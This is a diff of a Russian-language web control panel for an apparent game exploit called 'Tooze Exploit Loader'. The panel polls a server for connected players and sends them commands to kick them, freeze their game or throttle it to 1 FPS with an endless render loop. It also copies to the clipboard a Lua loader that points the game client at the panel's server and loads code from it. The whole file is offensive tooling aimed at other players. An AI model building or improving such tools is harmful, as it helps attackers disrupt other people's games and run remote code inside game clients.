@@ -77,10 +77,11 @@
         .main-panel.visible { display: flex; justify-content: center; opacity: 1; }
         .app { max-width: 1400px; width: 100%; }
 
-        .header { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; background: rgba(20, 20, 28, 0.7); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); margin-bottom: 22px; }
+        .header { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; background: rgba(20, 20, 28, 0.7); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); margin-bottom: 22px; flex-wrap: wrap; gap: 10px; }
         .header-left { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
         .logo { font-size: 24px; font-weight: 800; }
-        .loader-btn { background: rgba(236, 72, 153, 0.1); border: 1px solid var(--pink); color: var(--pink-3); padding: 8px 14px; font-size: 12px; font-weight: 700; border-radius: 11px; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .loader-btn { background: rgba(236, 72, 153, 0.1); border: 1px solid var(--pink); color: var(--pink-3); padding: 8px 14px; font-size: 12px; font-weight: 700; border-radius: 11px; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: all 0.2s; }
+        .loader-btn:hover { background: rgba(236, 72, 153, 0.2); }
         .stat-pill { display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: rgba(20, 20, 28, 0.6); border: 1px solid var(--line); border-radius: 11px; font-size: 12px; }
         .stat-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); }
 
@@ -97,6 +98,7 @@
         .player-card.selected { border-color: var(--pink); background: rgba(236, 72, 153, 0.05); }
         .player-avatar { width: 42px; height: 42px; border-radius: 12px; background: #000; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--pink-3); border: 1px solid var(--line-2); }
         .player-name { font-weight: 700; font-size: 13px; }
+        .player-status { margin-left: auto; font-size: 10px; }
 
         .command-panel { background: rgba(20, 20, 28, 0.6); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; }
         .panel-title { font-size: 15px; font-weight: 700; margin-bottom: 15px; }
@@ -158,16 +160,21 @@
                 <div class="panel-title">Управление: <span id="targetName" style="color:var(--pink);">Никто не выбран</span></div>
                 
                 <div class="cmd-group">
-                    <span class="cmd-label">Lag Engine</span>
-                    <div class="toggle-wrap" id="toggleLag"><span class="label">Залагать игрока</span><span class="status-text">OFF</span></div>
+                    <span class="cmd-label">Lag Engine (1 FPS)</span>
+                    <div class="toggle-wrap" id="toggleLag">
+                        <span class="label">🐌 Ограничить до 1 FPS</span>
+                        <span class="status-text">OFF</span>
+                    </div>
+                    <div style="font-size:10px;color:var(--text-4);margin-top:4px;">Включает бесконечный цикл рендера</div>
                 </div>
 
                 <div class="cmd-group">
                     <span class="cmd-label">Действия</span>
                     <div class="cmd-btn-group">
                         <button class="cmd-btn danger" id="btnKick">🚫 Kick</button>
-                        <button class="cmd-btn warning" id="btnCrash">💥 Crash</button>
+                        <button class="cmd-btn warning" id="btnCrash">💥 Freeze</button>
                     </div>
+                    <div style="font-size:10px;color:var(--text-4);margin-top:4px;">Freeze полностью парализует игру</div>
                 </div>
             </aside>
         </div>
@@ -206,7 +213,7 @@
 
     // === КОПИРОВАНИЕ ЛОАДЕРА ===
     $('#getLoaderBtn').addEventListener('click', () => {
-        const luaScript = `-- Tooze Exploit Loader
+        const luaScript = `-- Tooze Exploit Loader v5
 local serverUrl = "${SERVER_URL}"
 _G.ToozeServer = serverUrl
 print("🔄 Загрузка Tooze...")
@@ -219,7 +226,7 @@ if success then
 else
     warn("❌ Ошибка загрузки: " .. tostring(result))
 end`;
-        navigator.clipboard.writeText(luaScript).then(() => showToast('✅ Скрипт лоадера скопирован в буфер!'));
+        navigator.clipboard.writeText(luaScript).then(() => showToast('✅ Скрипт лоадера скопирован!'));
     });
 
     // === ОБНОВЛЕНИЕ СПИСКА ИГРОКОВ ===
@@ -230,7 +237,6 @@ end`;
             });
             const players = await res.json();
             
-            // Сохраняем данные для быстрого доступа
             playersData = {};
             players.forEach(p => { playersData[p.username] = p; });
             
@@ -253,7 +259,7 @@ end`;
                 card.innerHTML = `
                     <div class="player-avatar">${p.username[0].toUpperCase()}</div>
                     <div class="player-name">${p.username}</div>
-                    ${p.lagActive ? '<span style="margin-left:auto;color:var(--amber);font-size:10px;">🐌 LAG</span>' : ''}
+                    <div class="player-status">${p.lagActive ? '🐌 1 FPS' : '✅'}</div>
                 `;
                 card.addEventListener('click', () => {
                     selectPlayer(p.username);
@@ -270,7 +276,6 @@ end`;
         currentTarget = username;
         $('#targetName').textContent = username;
         
-        // Обновляем выделение
         document.querySelectorAll('.player-card').forEach(c => c.classList.remove('selected'));
         document.querySelectorAll('.player-card').forEach(c => {
             if (c.textContent.includes(username)) {
@@ -278,7 +283,6 @@ end`;
             }
         });
         
-        // Обновляем состояние тогла
         const player = playersData[username];
         if (player) {
             const toggle = $('#toggleLag');
@@ -308,7 +312,12 @@ end`;
             });
             
             if (res.ok) {
-                showToast(`✅ Команда ${command} отправлена игроку ${currentTarget}!`);
+                const commands = {
+                    'kick': '🚫 Кик',
+                    'crash': '💥 Заморозка',
+                    'lag': '🐌 1 FPS'
+                };
+                showToast(`✅ ${commands[command] || command} отправлена игроку ${currentTarget}!`);
             } else {
                 showToast(`❌ Ошибка: ${res.status}`);
             }
@@ -346,7 +355,6 @@ end`;
         setInterval(updatePlayers, 3000);
     }
 
-    // Нажатие Enter для входа
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Enter' && $('#keyInput').value) {
             $('#loginForm').dispatchEvent(new Event('submit'));
